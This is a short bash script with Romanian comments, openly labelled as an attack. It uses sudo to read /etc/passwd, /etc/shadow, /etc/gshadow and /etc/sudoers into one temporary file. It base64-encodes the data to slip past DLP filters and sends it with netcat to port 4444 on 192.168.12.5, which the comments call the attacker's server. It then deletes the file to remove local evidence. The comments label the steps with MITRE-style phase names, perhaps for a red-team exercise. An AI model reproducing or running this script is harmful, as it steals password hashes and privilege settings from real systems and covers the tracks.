#!/bin/bash

echo "[*] Incepere colectare date sensibile..."

# 1. Colectarea datelor (Reconnaissance & Collection)
# Folosește 'sudo -S' (citește parola de la stdin, util pentru scripturi automate) 
# pentru a citi fișierele critice și le adaugă pe toate într-un fișier temporar.
sudo -S cat /etc/passwd > /tmp/data.tmp
sudo -S cat /etc/shadow >> /tmp/data.tmp
sudo -S cat /etc/gshadow >> /tmp/data.tmp
sudo -S cat /etc/sudoers >> /tmp/data.tmp

echo "[*] Date colectate. Incepere exfiltrare..."

# 2. Obfuscare și Exfiltrare (Defense Evasion & Exfiltration)
# Codifică fișierul agregat în base64 (pentru a trece de filtrele simple tip text/DLP) 
# și îl trimite prin țeavă (|) direct către serverul atacatorului folosind netcat.
base64 /tmp/data.tmp | nc -w 3 192.168.12.5 4444

echo "[*] Curățenie..."

# 3. Ștergerea urmelor (Cleanup)
# Șterge fișierul temporar pentru a nu lăsa dovezi locale.
rm /tmp/data.tmp

echo "[*] Gata."
